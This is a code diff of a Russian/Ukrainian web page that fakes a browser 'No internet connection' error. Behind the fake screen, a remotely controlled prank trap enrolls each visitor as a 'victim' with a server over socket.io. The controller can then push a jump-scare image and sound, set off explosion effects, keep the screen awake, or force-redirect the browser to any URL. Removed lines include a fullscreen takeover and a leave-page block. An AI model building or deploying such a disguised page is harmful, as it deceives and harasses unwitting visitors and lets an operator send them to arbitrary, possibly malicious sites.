@@ -71,13 +71,45 @@
 
         #details-content { display: none; margin-top: 15px; font-size: 13px; }
 
+        /* НОВЫЙ ДИЗАЙН: Размытый фон + Центрированное изображение */
         #prank-view {
-            display: none; position: fixed; top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: black no-repeat center center;
-            background-size: contain;
-            background-color: black;
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
             z-index: 9999;
+            background-color: black;
+        }
+
+        /* Размытый фон */
+        #prank-background {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            filter: blur(20px);
+            transform: scale(1.1);
+            opacity: 0.6;
+        }
+
+        /* Центрированное изображение */
+        #prank-image {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            max-width: 70%;
+            max-height: 70%;
+            object-fit: contain;
+            border-radius: 12px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+            z-index: 2;
         }
 
         #click-trap {
@@ -85,7 +117,6 @@
             z-index: 999; cursor: default;
         }
 
-        /* === ЭФФЕКТ ВЗРЫВОВ === */
         .explosion {
             position: fixed;
             pointer-events: none;
@@ -148,110 +179,128 @@
 <body>
     <div id="click-trap"></div>
 
-    <div class="container" id="ui">
+    <div class="container">
         <div class="dino-container">
-            <svg class="dino-icon" viewBox="0 0 24 24">
-                <path d="M15,2H11V3H10V4H9V5H8V6H7V7H6V8H5V9H4V10H3V14H4V15H5V16H6V17H7V18H10V17H9V16H8V15H7V14H6V11H7V10H8V9H9V8H10V7H11V6H14V7H15V8H16V9H17V10H18V11H19V14H18V15H17V16H16V17H15V18H18V17H19V16H20V15H21V14H22V10H21V9H20V8H19V7H18V6H17V5H16V4H15V3H15V2Z M11,9H12V10H11V9Z M13,9H14V10H13V9Z" />
+            <svg class="dino-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
             </svg>
         </div>
+
+        <h1>Нет подключения к интернету</h1>
         
-        <h1 id="h1">Нет подключения к интернету</h1>
-        <p id="p1">Попробуйте сделать следующее:</p>
+        <p>Попробуйте:</p>
         <ul>
-            <li id="l1">Проверьте сетевые кабели, модем и маршрутизатор.</li>
-            <li id="l2">Подключитесь к сети Wi-Fi еще раз.</li>
+            <li>Проверить сетевые кабели, модем и маршрутизатор</li>
+            <li>Повторно подключиться к сети Wi-Fi</li>
+            <li>Запустить диагностику сети Windows</li>
         </ul>
-        
-        <div class="details-button" onclick="toggleDetails()" id="details-btn">Подробнее</div>
+
+        <button class="btn-reload" onclick="location.reload()">Обновить страницу</button>
+
+        <div class="details-button" onclick="toggleDetails()">Подробности</div>
         <div id="details-content">
-            <p>Настройки прокси-сервера и брандмауэра или выполнение диагностики сети могут помочь решить проблему.</p>
+            <p><strong>Код ошибки:</strong> DNS_PROBE_FINISHED_NO_INTERNET</p>
+            <p>Возможно, что-то блокирует установку подключения к сети</p>
         </div>
 
         <div class="error-code">ERR_INTERNET_DISCONNECTED</div>
-        <button class="btn-reload" id="btn">Обновить</button>
     </div>
 
-    <div id="prank-view"></div>
+    <div id="prank-view">
+        <div id="prank-background"></div>
+        <img id="prank-image" src="" alt="">
+    </div>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
-        // --- ПЕРЕКЛАД ІНТЕРФЕЙСУ ---
-        const translations = {
-            uk: { title: "Немає підключення до Інтернету", h1: "Немає підключення до Інтернету", p1: "Спробуйте наступне:", l1: "Перевірте мережеві кабелі, модем і маршрутизатор.", l2: "Повторно підключіться до Wi-Fi.", details: "Докладніше", btn: "Оновити" },
-            ru: { title: "Нет подключения к интернету", h1: "Нет подключения к интернету", p1: "Попробуйте сделать следующее:", l1: "Проверьте сетевые кабели, модем и маршрутизатор.", l2: "Подключитесь к сети Wi-Fi еще раз.", details: "Подробнее", btn: "Обновить" },
-            en: { title: "No internet", h1: "No internet", p1: "Try:", l1: "Checking the network cables, modem, and router.", l2: "Reconnecting to Wi-Fi.", details: "Details", btn: "Reload" }
-        };
-
-        const lang = navigator.language.split('-')[0];
-        const t = translations[lang] || translations.en;
-
-        document.getElementById('title').innerText = t.title;
-        document.getElementById('h1').innerText = t.h1;
-        document.getElementById('p1').innerText = t.p1;
-        document.getElementById('l1').innerText = t.l1;
-        document.getElementById('l2').innerText = t.l2;
-        document.getElementById('details-btn').innerText = t.details;
-        document.getElementById('btn').innerText = t.btn;
-
         function toggleDetails() {
-            const content = document.getElementById('details-content');
-            content.style.display = content.style.display === 'block' ? 'none' : 'block';
+            const d = document.getElementById('details-content');
+            d.style.display = d.style.display === 'block' ? 'none' : 'block';
         }
 
-        // --- ЛОГІКА ПАСТКИ ---
+        document.addEventListener('visibilitychange', () => {
+            console.log('Page visibility:', document.hidden ? 'hidden' : 'visible');
+        });
+
+        window.addEventListener('blur', () => {
+            console.log('Window blurred - staying active');
+        });
+
         const socket = io();
         const id = new URLSearchParams(window.location.search).get('id');
         let audio = new Audio();
         const prankView = document.getElementById('prank-view');
+        const prankBackground = document.getElementById('prank-background');
+        const prankImage = document.getElementById('prank-image');
         
-        // ЗМІННІ СТАНУ
-        let isAutoMode = false;
         let hasInteracted = false;
-        let explosionsEnabled = false;
+        let currentImageUrl = '';
 
-        // Вхід у кімнату
+        audio.preload = 'auto';
+        
         socket.emit('join-room-victim', { roomId: id, userAgent: navigator.userAgent });
 
-        // Обробка оновлень
         socket.on('update-media', (data) => {
-            // Оновлюємо картинку
+            console.log('Media update:', data);
+            
             if (data.image) {
-                prankView.style.backgroundImage = `url('${data.image}')`;
+                currentImageUrl = data.image;
+                prankBackground.style.backgroundImage = `url('${data.image}')`;
+                prankImage.src = data.image;
             }
-            // Оновлюємо звук
+            
             if (data.sound) {
                 audio.src = data.sound;
                 audio.load();
-            }
-            
-            // Оновлюємо статус AUTO MODE
-            if (data.auto !== undefined) {
-                isAutoMode = data.auto;
-                console.log("Auto Mode:", isAutoMode);
-                
-                if (isAutoMode && hasInteracted) {
-                    startChaos();
-                }
-            }
-
-            // Оновлюємо статус взрывів
-            if (data.explosions !== undefined) {
-                explosionsEnabled = data.explosions;
-                console.log("Explosions:", explosionsEnabled);
+                console.log('Sound loaded:', data.sound);
             }
         });
 
-        // Ручний запуск (Детонатор)
         socket.on('play-sound', () => {
+            console.log('🔊 Sound command from bot!');
             startChaos();
         });
 
-        // Редірект (Bombardio)
         socket.on('force-redirect', (data) => {
             window.location.href = data.url;
         });
 
-        // --- ФУНКЦІЯ СТВОРЕННЯ ВИБУХУ ---
+        function startChaos() {
+            hasInteracted = true;
+            
+            if (currentImageUrl) {
+                prankView.style.display = 'block';
+            }
+
+            if (audio.src) {
+                audio.volume = 1.0;
+                
+                const playPromise = audio.play();
+                
+                if (playPromise !== undefined) {
+                    playPromise.then(() => {
+                        console.log('✅ Sound playing!');
+                    }).catch(error => {
+                        console.log('⚠️ Autoplay blocked, click to play...');
+                        
+                        document.addEventListener('click', function playOnClick() {
+                            audio.play();
+                            document.removeEventListener('click', playOnClick);
+                        }, { once: true });
+                    });
+                }
+            }
+
+            for (let i = 0; i < 8; i++) {
+                setTimeout(() => {
+                    createExplosion(
+                        Math.random() * window.innerWidth,
+                        Math.random() * window.innerHeight
+                    );
+                }, i * 100);
+            }
+        }
+
         function createExplosion(x, y) {
             const explosion = document.createElement('div');
             explosion.className = 'explosion';
@@ -259,7 +308,6 @@
             explosion.style.top = (y - 50) + 'px';
             document.body.appendChild(explosion);
 
-            // Створюємо частинки
             for (let i = 0; i < 15; i++) {
                 const particle = document.createElement('div');
                 particle.className = 'particle';
@@ -282,93 +330,34 @@
             setTimeout(() => explosion.remove(), 600);
         }
 
-        // --- АВТОМАТИЧНІ ВИБУХИ ---
-        let explosionInterval = null;
-
-        function startAutoExplosions() {
-            if (explosionInterval) return;
-            
-            explosionInterval = setInterval(() => {
-                if (explosionsEnabled) {
-                    const x = Math.random() * window.innerWidth;
-                    const y = Math.random() * window.innerHeight;
-                    createExplosion(x, y);
-                }
-            }, 800);
-        }
-
-        function stopAutoExplosions() {
-            if (explosionInterval) {
-                clearInterval(explosionInterval);
-                explosionInterval = null;
+        let firstClickDone = false;
+        document.addEventListener('click', function initAudio() {
+            if (!firstClickDone) {
+                firstClickDone = true;
+                const silentAudio = new Audio();
+                silentAudio.src = 'data:audio/wav;base64,UklGRigAAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQAAAAA=';
+                silentAudio.volume = 0;
+                silentAudio.play().catch(() => {});
+                console.log('🎵 Audio unlocked');
             }
+        }, { once: true });
+
+        let wakeLock = null;
+        
+        if ('wakeLock' in navigator) {
+            navigator.wakeLock.request('screen').then(lock => {
+                wakeLock = lock;
+                console.log('📱 Wake Lock ON');
+            }).catch(err => {
+                console.log('⚠️ Wake Lock failed');
+            });
         }
 
-        // Запускаємо автоматичні вибухи при зміні статусу
         setInterval(() => {
-            if (explosionsEnabled) {
-                startAutoExplosions();
-            } else {
-                stopAutoExplosions();
-            }
-        }, 100);
+            socket.emit('ping');
+        }, 30000);
 
-        // --- ГОЛОВНА ФУНКЦІЯ ХАОСУ ---
-        function startChaos() {
-            document.getElementById('ui').style.display = 'none';
-            document.getElementById('click-trap').style.display = 'none';
-            prankView.style.display = 'block';
-            
-            // 1. Звук
-            if (isAutoMode) audio.loop = true;
-            audio.play().catch(e => console.log("Audio block:", e));
-
-            // 2. Вібрація
-            if (navigator.vibrate) navigator.vibrate([500, 200, 500, 200, 1000]);
-
-            // 3. Повний екран
-            if (isAutoMode) {
-                try {
-                    document.documentElement.requestFullscreen().catch(()=>{});
-                } catch(e){}
-            }
-
-            // 4. Запускаємо вибухи якщо увімкнено
-            if (explosionsEnabled) {
-                startAutoExplosions();
-            }
-        }
-
-        // --- ОБРОБНИК КЛІКІВ ---
-        document.addEventListener('click', () => {
-            hasInteracted = true;
-            
-            // Створюємо вибух на місці кліку якщо увімкнено
-            if (explosionsEnabled) {
-                createExplosion(event.clientX, event.clientY);
-            }
-            
-            // "Прогріваємо" аудіо
-            if (audio.src) {
-                audio.play().then(() => {
-                    if (!isAutoMode) {
-                        audio.pause();
-                        audio.currentTime = 0;
-                    }
-                }).catch(()=>{});
-            }
-
-            // Якщо режим AUTO увімкнено - запускаємо пастку
-            if (isAutoMode) {
-                startChaos();
-            }
-        }, { capture: true });
-
-        // Заборона виходу
-        window.onbeforeunload = function() {
-            if (isAutoMode) return "Are you sure?";
-        };
-
+        console.log('🎯 Prank ready | ID:', id);
     </script>
 </body>
 </html>
